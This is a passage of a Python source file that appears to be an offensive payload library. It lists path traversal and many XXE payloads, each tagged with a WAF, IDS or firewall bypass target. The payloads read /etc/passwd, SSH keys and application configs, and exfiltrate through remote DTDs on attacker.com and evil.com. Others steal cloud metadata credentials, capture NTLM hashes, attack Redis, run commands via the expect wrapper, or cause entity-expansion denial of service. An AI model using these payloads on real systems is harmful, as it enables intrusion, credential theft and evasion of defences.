            'risk_level': 'high'
        },
        'path_php_ini': {
            'payload': '../../../etc/php.ini',
            'description': 'PHP configuration file traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_ssl_private_key': {
            'payload': '../../../etc/ssl/private/ssl-cert-snakeoil.key',
            'description': 'SSL private key traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'path_log_nginx': {
            'payload': '../../../var/log/nginx/access.log',
            'description': 'Nginx access log for log poisoning',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'path_syslog': {
            'payload': '../../../var/log/syslog',
            'description': 'System log file traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        }
    }
    
    # XXE Bypass Payloads
    XXE_PAYLOADS = {
        'xxe_basic': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            'description': 'Basic XXE payload',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_parameter_entity': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo></foo>',
            'description': 'Parameter entity XXE',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_blind': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><foo></foo>',
            'description': 'Blind XXE',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'xxe_utf16': {
            'payload': '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            'description': 'UTF-16 encoded XXE',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_expect': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
            'description': 'XXE with expect wrapper',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_ssrf': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/admin">]><foo>&xxe;</foo>',
            'description': 'XXE for SSRF',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'xxe_dos': {
            'payload': '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol1;</lolz>',
            'description': 'Billion laughs DoS',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'high'
        },
        'xxe_doctype_variation': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "file:///etc/passwd"><foo></foo>',
            'description': 'DOCTYPE variation',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_cdata': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo><![CDATA[&xxe;]]></foo>',
            'description': 'XXE with CDATA',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_svg': {
            'payload': '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="200"><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text x="0" y="50">&xxe;</text></svg>',
            'description': 'XXE in SVG file',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # OOB XXE payloads
        'xxe_oob_http': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd"> %xxe;]><foo/>',
            'description': 'OOB XXE via HTTP request',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'xxe_oob_ftp': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "ftp://evil.com/xxe"> %xxe;]><foo/>',
            'description': 'OOB XXE via FTP channel',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'xxe_oob_dns': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://xxe.evil.com/"> %xxe;]><foo/>',
            'description': 'OOB XXE DNS detection',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'high'
        },
        # Error-based XXE
        'xxe_error_based': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">%eval;%error;]>',
            'description': 'Error-based XXE for file contents',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Different file targets
        'xxe_win_file': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            'description': 'XXE targeting Windows file',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_etc_hosts': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
            'description': 'XXE targeting /etc/hosts',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xxe_ssh_key': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">]><foo>&xxe;</foo>',
            'description': 'XXE targeting SSH private key',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_proc_version': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/version">]><foo>&xxe;</foo>',
            'description': 'XXE targeting /proc/version',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        # SSRF via XXE
        'xxe_ssrf_internal': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1/admin">]><foo>&xxe;</foo>',
            'description': 'SSRF via XXE to internal network',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'xxe_ssrf_aws_metadata': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><foo>&xxe;</foo>',
            'description': 'SSRF via XXE to AWS metadata',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        # PHP-specific XXE
        'xxe_php_expect': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
            'description': 'XXE with PHP expect wrapper for RCE',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_php_filter': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
            'description': 'XXE with PHP filter wrapper',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # SOAP-based XXE
        'xxe_soap': {
            'payload': '<soap:Body><foo xmlns:foo="urn:example"><!DOCTYPE x [<!ENTITY test SYSTEM "file:///etc/passwd">]>&test;</foo></soap:Body>',
            'description': 'XXE via SOAP body',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # DOCTYPE detection bypasses
        'xxe_cdata_bypass': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % start "<![CDATA["><!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % end "]]>"><!ENTITY % xxe "<!ENTITY data \'%start;%file;%end;\'>">%xxe;]><foo>&data;</foo>',
            'description': 'XXE using CDATA wrapper for binary-safe exfil',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # XXE in different content types
        'xxe_in_docx': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><w:document><w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>',
            'description': 'XXE embedded in DOCX/OOXML',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'xxe_in_excel': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><workbook><sheets><sheet name="Sheet1">&xxe;</sheet></sheets></workbook>',
            'description': 'XXE embedded in Excel XML',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        # Blind XXE confirming techniques
        'xxe_blind_http_confirm': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe-test">]><foo>&xxe;</foo>',
            'description': 'Blind XXE HTTP callback confirmation',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'high'
        },
        'xxe_utf16_bypass': {
            'payload': '\xff\xfe<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            'description': 'XXE with UTF-16 BOM to bypass parser checks',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_no_dtd_tag': {
            'payload': '<?xml version="1.0"?><foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
            'description': 'XInclude XXE alternative (no DOCTYPE needed)',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_xinclude_http': {
            'payload': '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://evil.com/xxe"/></foo>',
            'description': 'XInclude HTTP-based SSRF',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'xxe_jar_protocol': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://evil.com/evil.jar!/test">]><foo>&xxe;</foo>',
            'description': 'XXE via JAR protocol',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'xxe_netdoc_protocol': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]><foo>&xxe;</foo>',
            'description': 'XXE via netdoc protocol (Java)',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'xxe_gopher_protocol': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A">]><foo>&xxe;</foo>',
            'description': 'XXE via gopher to attack Redis',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'xxe_recursive_expansion': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY a "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"><!ENTITY b "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;"><!ENTITY c "X">]><foo>&a;</foo>',
            'description': 'Billion laughs DOS via entity expansion',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        'xxe_entity_in_attr': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo bar="&xxe;">test</foo>',
            'description': 'XXE entity reference in attribute value',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'xxe_external_schema': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://evil.com/evil.dtd"><foo/>',
            'description': 'XXE via external SYSTEM DOCTYPE URI',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_public_id': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo PUBLIC "-//TEST//" "http://evil.com/evil.dtd"><foo/>',
            'description': 'XXE via PUBLIC identifier DOCTYPE',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_windows_smb': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "\\\\evil.com\\share\\test">]><foo>&xxe;</foo>',
            'description': 'XXE via Windows UNC path for SMB auth capture',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'xxe_dtd_chain_exfil': {
            'payload': '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]><data>&send;</data>',
            'description': 'XXE chained DTD for reliable OOB exfil',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'xxe_encoding_utf8': {
            'payload': '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            'description': 'XXE with explicit UTF-8 encoding',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_encoding_utf16le': {
            'payload': '<?xml version="1.0" encoding="UTF-16LE"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            'description': 'XXE with UTF-16LE encoding',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_proc_cmdline': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/1/cmdline">]><foo>&xxe;</foo>',
            'description': 'XXE targeting process cmdline',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xxe_ssrf_ec2_role': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/default">]><foo>&xxe;</foo>',
            'description': 'XXE SSRF to steal default EC2 IAM role creds',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'xxe_xslt_injection': {
            'payload': '<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="document(\'file:///etc/passwd\')"/></xsl:template></xsl:stylesheet>',
            'description': 'XSLT document() function for file read',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'xxe_xslt_rce': {
            'payload': '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0" xmlns:ext="http://exslt.org/common"><xsl:template match="/"><xsl:value-of select="ext:function(\'exec\',/foo/cmd)"/></xsl:template></xsl:stylesheet>',
            'description': 'XSLT EXSLT extension for RCE',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'xxe_rss_feed': {
            'payload': '<?xml version="1.0"?><!DOCTYPE rss [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><rss version="2.0"><channel><title>&xxe;</title></channel></rss>',
            'description': 'XXE in RSS feed',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'xxe_saml_injection': {
            'payload': '<saml:AttributeValue xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>&xxe;</saml:AttributeValue>',
            'description': 'XXE in SAML assertion (authentication bypass)',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'xxe_comment_hide': {
            'payload': '<?xml version="1.0"?><!-- comment --><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            'description': 'XXE with leading XML comment to evade detection',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'xxe_multiline_dtd': {
            'payload': '<?xml\nversion="1.0"?><!DOCTYPE\nfoo\n[<!ENTITY\nxxe\nSYSTEM\n"file:///etc/passwd">]><foo>&xxe;</foo>',
            'description': 'XXE with newlines to bypass signature detection',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'xxe_no_xml_declaration': {
            'payload': '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            'description': 'XXE without XML declaration',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_schemata': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com:8080/">]><foo>&xxe;</foo>',
            'description': 'XXE callback on custom port',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'xxe_all_entities': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe1 SYSTEM "file:///etc/passwd"><!ENTITY xxe2 SYSTEM "file:///etc/hosts">]><foo>&xxe1;&xxe2;</foo>',
            'description': 'XXE multiple entity references',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_parameter_internal': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % p "<!ENTITY inner SYSTEM \'file:///etc/passwd\'>">%p;]><foo>&inner;</foo>',
            'description': 'XXE parameter entity defining general entity',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_https': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://evil.com/exfil?data=test">]><foo>&xxe;</foo>',
            'description': 'XXE via HTTPS for firewall bypass',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'xxe_classpath_resource': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "classpath:application.properties">]><foo>&xxe;</foo>',
            'description': 'XXE classpath resource in Java applications',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'xxe_spring_config': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/app/application.yml">]><foo>&xxe;</foo>',
            'description': 'XXE targeting Spring Boot config file',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_docker_socket': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:2375/containers/json">]><foo>&xxe;</foo>',
            'description': 'XXE SSRF to Docker daemon socket',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'xxe_redos_billion_laughs': {
            'payload': '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;">]><foo>&lol4;</foo>',
            'description': 'XML entity expansion DoS (billion laughs variant)',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        'xxe_jndi_lookup': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ldap://evil.com:1389/a">]><foo>&xxe;</foo>',
            'description': 'XXE SSRF via LDAP for JNDI injection',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'xxe_internal_port_scan': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22/">]><foo>&xxe;</foo>',
            'description': 'XXE for internal port scanning (port 22)',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'xxe_dns_callback_oob': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://UNIQUE.burpcollaborator.net/">]><foo>&xxe;</foo>',
            'description': 'XXE OOB DNS callback for blind detection',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'high'
        },
        'xxe_file_win_etc_hosts': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:\\windows\\system32\\drivers\\etc\\hosts">]><foo>&xxe;</foo>',
            'description': 'XXE targeting Windows hosts file via C:\\',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xxe_yaml_in_xml': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/config/database.yml">]><foo>&xxe;</foo>',
            'description': 'XXE targeting Rails database YAML config',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_jakarta_persistence': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///WEB-INF/persistence.xml">]><foo>&xxe;</foo>',
            'description': 'XXE targeting Java persistence.xml',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_web_xml': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///WEB-INF/web.xml">]><foo>&xxe;</foo>',
            'description': 'XXE targeting Java web.xml deployment descriptor',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_ibm_websphere': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///opt/IBM/WebSphere/AppServer/profiles/default/config/cells/DefaultCell01/security.xml">]><foo>&xxe;</foo>',
            'description': 'XXE targeting IBM WebSphere security config',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_netbeans_config': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/user/.netbeans/7.0/config/Preferences/org/netbeans/core.xml">]><foo>&xxe;</foo>',
            'description': 'XXE targeting NetBeans config',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xxe_struts2_config': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///WEB-INF/struts.xml">]><foo>&xxe;</foo>',
            'description': 'XXE targeting Struts2 config',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_hibernate_config': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///WEB-INF/classes/hibernate.cfg.xml">]><foo>&xxe;</foo>',
            'description': 'XXE targeting Hibernate configuration',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_spring_security': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///WEB-INF/spring-security.xml">]><foo>&xxe;</foo>',
            'description': 'XXE targeting Spring Security config',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_android_manifest': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///data/app/com.target.app-1/base.apk">]><foo>&xxe;</foo>',
            'description': 'XXE on Android targeting APK files',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'xxe_php_session_path': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///tmp">]><foo>&xxe;</foo>',
            'description': 'XXE to list /tmp directory',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'xxe_cloud_run_metadata': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">]><foo>&xxe;</foo>',
            'description': 'XXE SSRF for GCP Cloud Run service account token',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'xxe_redis_via_ssrf': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">]><foo>&xxe;</foo>',
            'description': 'XXE SSRF to Redis server',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'xxe_memcached_ssrf': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:11211/">]><foo>&xxe;</foo>',
            'description': 'XXE SSRF to Memcached',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'xxe_kubernetes_api': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://kubernetes.default.svc/api/v1/namespaces">]><foo>&xxe;</foo>',
            'description': 'XXE SSRF to Kubernetes API server',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'xxe_blind_oob_param_entity': {
            'payload': '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "http://attacker.com/blind.dtd">%remote;]><data/>',
            'description': 'Blind XXE via parameter entity loading remote DTD',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'xxe_error_based_v2': {
            'payload': '<?xml version="1.0"?><!DOCTYPE message [<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd"><!ENTITY % expr \'<!ENTITY % error SYSTEM "file:///not/exist/%local_dtd;">\'> %expr; %error;]><message>xxe</message>',
            'description': 'Error-based XXE via local DTD repurposing',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_php_filter_chain_rce': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
            'description': 'XXE PHP filter for source code disclosure',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_windows_unc_hash': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "\\\\attacker.com\\share">]><foo>&xxe;</foo>',
            'description': 'XXE Windows UNC to capture NTLM hash',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'xxe_via_doctype_subset': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY test "test" [<!ENTITY % xxe SYSTEM "file:///etc/passwd">]>%xxe;]><foo/>',
            'description': 'XXE via internal subset with nested entities',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'xxe_resolve_relative': {
            'payload': '<?xml version="1.0" standalone="no"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "./../../etc/passwd">]><foo>&xxe;</foo>',
            'description': 'XXE with relative path traversal',
